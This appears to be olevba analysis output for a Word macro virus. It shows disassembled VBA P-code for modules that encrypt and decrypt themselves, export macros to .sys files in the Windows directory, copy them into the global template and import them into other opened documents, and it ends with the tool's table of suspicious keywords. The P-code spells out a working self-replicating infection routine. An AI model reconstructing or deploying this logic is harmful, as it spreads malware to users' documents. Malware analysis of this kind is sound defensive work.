' 	Ld z$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0005 
' 	Add 
' 	Paren 
' 	LitDI2 0x007A 
' 	Gt 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #17:
' 	Ld nz$ 
' 	Ld z$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St nz$ 
' Line #18:
' 	Ld nz_tmp$ 
' 	LitStr 0x0001 "1"
' 	Add 
' 	St nz_tmp$ 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd deletelines 0x0002 
' 	St zz 
' Line #22:
' 	Ld i 
' 	Ld nz$ 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd InsertLines 0x0002 
' 	St zz 
' Line #23:
' 	QuoteRem 0x0001 0x0035 "zz_tmp = t_tmp.CodeModule.InsertLines(i - 2, nz_tmp$)"
' Line #24:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #25:
' 	GoTo l1 
' Line #26:
' 	Label l2 
' Line #27:
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0000 
' Line #28:
' 	EndSub 
' Line #29:
' 	FuncDefn (Sub decript())
' Line #30:
' 	SetStmt 
' 	LitStr 0x0003 "I_n"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set t 
' Line #31:
' 	SetStmt 
' 	LitStr 0x0003 "TMP"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set t_tmp 
' Line #32:
' 	LitStr 0x0001 "%"
' 	St z$ 
' Line #33:
' 	LitDI2 0x0003 
' 	St i 
' Line #34:
' 	Label l1 
' Line #35:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "I_n"
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St z$ 
' Line #36:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Sub 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "TMP"
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St z_tmp$ 
' Line #37:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "I_n"
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo l2 
' 	EndIf 
' Line #38:
' 	LitStr 0x0000 ""
' 	St nz$ 
' Line #39:
' 	LitStr 0x0000 ""
' 	St nz_tmp$ 
' Line #40:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld z$ 
' 	FnLen 
' 	For 
' Line #41:
' 	Ld z_tmp$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	IfBlock 
' Line #42:
' 	Ld nz$ 
' 	Ld z$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0005 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St nz$ 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	Ld z_tmp$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	IfBlock 
' Line #45:
' 	Ld nz$ 
' 	Ld z$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St nz$ 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #48:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd deletelines 0x0002 
' 	St zz 
' 	QuoteRem 0x0025 0x000C "номер,кол-ко"
' Line #49:
' 	Ld i 
' 	Ld nz$ 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd InsertLines 0x0002 
' 	St zz 
' Line #50:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #51:
' 	GoTo l1 
' Line #52:
' 	Label l2 
' Line #53:
' 	QuoteRem 0x0000 0x0043 "zz = t_tmp.CodeModule.deletelines(1, t_tmp.CodeModule.CountOfLines)"
' Line #54:
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0000 
' Line #55:
' 	EndSub 
' Macros/VBA/autoopen - 928 bytes
' Line #0:
' 	FuncDefn (Sub Autoopen())
' Line #1:
' 	Ld Criptor 
' 	ArgsMemCall (Call) decript 0x0000 
' Line #2:
' 	Ld I_n 
' 	ArgsMemCall (Call) I_n 0x0000 
' Line #3:
' 	Ld Criptor 
' 	ArgsMemCall (Call) cript 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' Macros/VBA/FileOpen - 1330 bytes
' Line #0:
' 	FuncDefn (Sub FileOpen())
' Line #1:
' 	LitDI2 0x0015 
' 	St virus_test 
' Line #2:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	St dialog_test 
' Line #3:
' 	Ld dialog_test 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Vir_ok 
' 	EndIf 
' Line #4:
' 	OnError Vir_ok 
' Line #5:
' 	StartForVariable 
' 	Ld VbComponent 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #6:
' 	OnError Vir_ok 
' Line #7:
' 	Ld VbComponent 
' 	MemLd New 
' 	LitStr 0x0009 "Dead_Byte"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0036 
' 	St virus_test 
' 	EndIf 
' Line #8:
' 	StartForVariable 
' 	Next 
' Line #9:
' 	Ld virus_test 
' 	LitDI2 0x0036 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Vir_ok 
' 	EndIf 
' Line #10:
' 	Ld I_d 
' 	ArgsMemCall (Call) I_d 0x0000 
' Line #11:
' 	Label Vir_ok 
' Line #12:
' 	EndSub 
' Macros/VBA/I_n - 4027 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' 	FuncDefn (Sub I_n())
' Line #2:
' 	QuoteRem 0x0000 0x0013 "Inr wnsif Fx Xywnsl"
' Line #3:
' 	QuoteRem 0x0000 0x0055 "wnsif B "                                                                           ""
' Line #4:
' 	QuoteRem 0x0000 0x0023 "s B LjyWnsitwxInwjhytwy(wnsif, 255)"
' Line #5:
' 	QuoteRem 0x0000 0x0017 "wnsif B Qjky$(wnsif, s)"
' Line #6:
' 	QuoteRem 0x0000 0x0007 "yds B 1"
' Line #7:
' 	QuoteRem 0x0000 0x004F "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("IjfidGyyj").Jxutwy wnsif + "awnsix1.xyx""
' Line #8:
' 	QuoteRem 0x0000 0x004E "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("KnqjTujs").Jxutwy wnsif + "awnsix2.xyx""
' Line #9:
' 	QuoteRem 0x0000 0x004E "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("FzytTujs").Jxutwy wnsif + "awnsix3.xyx""
' Line #10:
' 	QuoteRem 0x0000 0x004F "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("FzytHqtxj").Jxutwy wnsif + "awnsix4.xyx""
' Line #11:
' 	QuoteRem 0x0000 0x004F "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("KnqjHqtxj").Jxutwy wnsif + "awnsix5.xyx""
' Line #12:
' 	QuoteRem 0x0000 0x0049 "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndi").Jxutwy wnsif + "awnsix6.xyx""
' Line #13:
' 	QuoteRem 0x0000 0x004A "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndsh").Jxutwy wnsif + "awnsix7.xyx""
' Line #14:
' 	QuoteRem 0x0000 0x004C "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Xyxyjr").Jxutwy wnsif + "awnsix8.xyx""
' Line #15:
' 	QuoteRem 0x0000 0x004A "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Ndsh").Jxutwy wnsif + "awnsix9.xyx""
' Line #16:
' 	QuoteRem 0x0000 0x004A "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("YRU").Jxutwy wnsif + "awnsix10.xyx""
' Line #17:
' 	QuoteRem 0x0000 0x004E "FhynvjIthzrjsy.VGUwtojhy.VGHtrutsjsyx("Hwnuytw").Jxutwy wnsif + "awnsix11.xyx""
' Line #18:
' 	QuoteRem 0x0000 0x0028 "Ktw o B 1 Yt WtwiGfxnh.HtzsyRfhwtx(0, 0)"
' Line #19:
' 	QuoteRem 0x0000 0x0040 " Nk WtwiGfxnh.[RfhwtSfrj$b(o, 0, 0) B "IjfidGyyj" Ymjs yds B 100"
' Line #20:
' 	QuoteRem 0x0000 0x0006 "Sjxy o"
' Line #21:
' 	QuoteRem 0x0000 0x0019 "Nk yds B 100 Ymjs LtYt tp"
' Line #22:
' 	QuoteRem 0x0000 0x0021 "kdsfrj$ B WtwiGfxnh.[KnqjSfrj$b()"
' Line #23:
' 	QuoteRem 0x0000 0x003E "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":IjfidGyyj", "Stwrfq:IjfidGyyj""
' Line #24:
' 	QuoteRem 0x0000 0x003C "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":KnqjTujs", "Stwrfq:KnqjTujs""
' Line #25:
' 	QuoteRem 0x0000 0x003E "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":KnqjHqtxj", "Stwrfq:KnqjHqtxj""
' Line #26:
' 	QuoteRem 0x0000 0x003E "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":FzytHqtxj", "Stwrfq:FzytHqtxj""
' Line #27:
' 	QuoteRem 0x0000 0x0032 "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Ndi", "Stwrfq:Ndi""
' Line #28:
' 	QuoteRem 0x0000 0x0034 "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Ndsh", "Stwrfq:Ndsh""
' Line #29:
' 	QuoteRem 0x0000 0x0032 "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":YRU", "Stwrfq:YRU""
' Line #30:
' 	QuoteRem 0x0000 0x003A "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Hwnuytw", "Stwrfq:Hwnuytw""
' Line #31:
' 	QuoteRem 0x0000 0x0038 "WtwiGfxnh.RfhwtHtuy kdsfrj$ + ":Xyxyjr", "Stwrfq:Xyxyjr""
' Line #32:
' 	QuoteRem 0x0000 0x0003 "tp:"
' Line #33:
' 	EndSub 
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Macros/VBA/I_d - 3293 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' 	FuncDefn (Sub I_d())
' Line #2:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0064 
' 	VarDefn m
' Line #3:
' 	Dim 
' 	VarDefn winda (As String)
' Line #4:
' 	Ld Timer 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #5:
' 	LitStr 0x004B "                                                                           "
' 	St winda 
' Line #6:
' 	Ld winda 
' 	LitDI2 0x00FF 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St n 
' Line #7:
' 	Ld winda 
' 	Ld n 
' 	ArgsLd LBound$ 0x0002 
' 	St winda 
' Line #8:
' 	LitDI2 0x0001 
' 	St min 
' 	BoS 0x0000 
' 	LitDI2 0x000B 
' 	St max 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St z 
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld max 
' 	For 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld i 
' 	ArgsSt m 0x0001 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	Label SS 
' Line #13:
' 	Ld max 
' 	Ld min 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	FnAbs 
' 	Mul 
' 	Ld min 
' 	Add 
' 	FnInt 
' 	St c 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld max 
' 	For 
' Line #15:
' 	Ld c 
' 	Ld i 
' 	ArgsLd m 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0064 
' 	St c 
' 	EndIf 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	Ld c 
' 	LitDI2 0x0064 
' 	Ne 
' 	If 
' 	BoS 0x0000 
' 	Ld z 
' 	LitDI2 0x0001 
' 	Add 
' 	St z 
' 	BoS 0x0000 
' 	Ld c 
' 	Ld z 
' 	ArgsSt m 0x0001 
' 	EndIf 
' Line #18:
' 	Ld z 
' 	Ld max 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo SS 
' 	EndIf 
' Line #19:
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld max 
' 	For 
' Line #21:
' 	Ld i 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000B "\winds1.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #22:
' 	Ld i 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000B "\winds2.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #23:
' 	Ld i 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000B "\winds3.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #24:
' 	Ld i 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000B "\winds4.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #25:
' 	Ld i 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000B "\winds5.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #26:
' 	Ld i 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000B "\winds6.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #27:
' 	Ld i 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000B "\winds7.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #28:
' 	Ld i 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000B "\winds8.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #29:
' 	Ld i 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000B "\winds9.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #30:
' 	Ld i 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000C "\winds10.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #31:
' 	Ld i 
' 	ArgsLd m 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld winda 
' 	LitStr 0x000C "\winds11.sys"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	LitStr 0x0003 "I_n"
' 	LitStr 0x0005 "I_nc1"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #34:
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' Macros/VBA/TMP - 3372 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0013 "0001100001001000000"
' Line #1:
' 	QuoteRem 0x0000 0x0055 "1000010111111111111111111111111111111111111111111111111111111111111111111111111111111"
' Line #2:
' 	QuoteRem 0x0000 0x0023 "01010001000010000000001110000111111"
' Line #3:
' 	QuoteRem 0x0000 0x0017 "10000101000011100001101"
' Line #4:
' 	QuoteRem 0x0000 0x0007 "0001011"
' Line #5:
' 	QuoteRem 0x0000 0x004F "0000100000000011000000001100000000000110000001001110100001100001111010000110101"
' Line #6:
' 	QuoteRem 0x0000 0x004E "000010000000001100000000110000000000011000000001110100001100001111010000110101"
' Line #7:
' 	QuoteRem 0x0000 0x004E "000010000000001100000000110000000000011000000001110100001100001111010000110101"
' Line #8:
' 	QuoteRem 0x0000 0x004F "0000100000000011000000001100000000000110000000001110100001100001111010000110101"
' Line #9:
' 	QuoteRem 0x0000 0x004F "0000100000000011000000001100000000000110000000001110100001100001111010000110101"
' Line #10:
' 	QuoteRem 0x0000 0x0049 "0000100000000011000000001100000000000110001110100001100001111010000110101"
' Line #11:
' 	QuoteRem 0x0000 0x004A "00001000000000110000000011000000000001100001110100001100001111010000110101"
' Line #12:
' 	QuoteRem 0x0000 0x004C "0000100000000011000000001100000000000110100001110100001100001111010000110101"
' Line #13:
' 	QuoteRem 0x0000 0x004A "00001000000000110000000011000000000001100001110100001100001111010000110101"
' Line #14:
' 	QuoteRem 0x0000 0x004A "00001000000000110000000011000000000001100011101000011000011110100001110101"
' Line #15:
' 	QuoteRem 0x0000 0x004E "000010000000001100000000110000000000011000000011101000011000011110100001110101"
' Line #16:
' 	QuoteRem 0x0000 0x0028 "0001010111001100000000100000000000111111"
' Line #17:
' 	QuoteRem 0x0000 0x0040 "1001100000000110000000001010111111110110000001001100001000101111"
' Line #18:
' 	QuoteRem 0x0000 0x0006 "001010"
' Line #19:
' 	QuoteRem 0x0000 0x0019 "0010001011111000010000100"
' Line #20:
' 	QuoteRem 0x0000 0x0021 "000000110110000000011000000001011"
' Line #21:
' 	QuoteRem 0x0000 0x003E "10000000010000000011000000111111000000100111100000010000001001"
' Line #22:
' 	QuoteRem 0x0000 0x003C "100000000100000000110000001111110000000011110000001000000001"
' Line #23:
' 	QuoteRem 0x0000 0x003E "10000000010000000011000000111111000000000111100000010000000001"
' Line #24:
' 	QuoteRem 0x0000 0x003E "10000000010000000011000000111111000000000111100000010000000001"
' Line #25:
' 	QuoteRem 0x0000 0x0032 "10000000010000000011000000111111000111100000010001"
' Line #26:
' 	QuoteRem 0x0000 0x0034 "1000000001000000001100000011111100001111000000100001"
' Line #27:
' 	QuoteRem 0x0000 0x0032 "10000000010000000011000000111111000111100000010001"
' Line #28:
' 	QuoteRem 0x0000 0x003A "1000000001000000001100000011111100000001111000000100000001"
' Line #29:
' 	QuoteRem 0x0000 0x0038 "10000000010000000011000000111111010000111100000010100001"
' Line #30:
' 	QuoteRem 0x0000 0x0003 "001"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

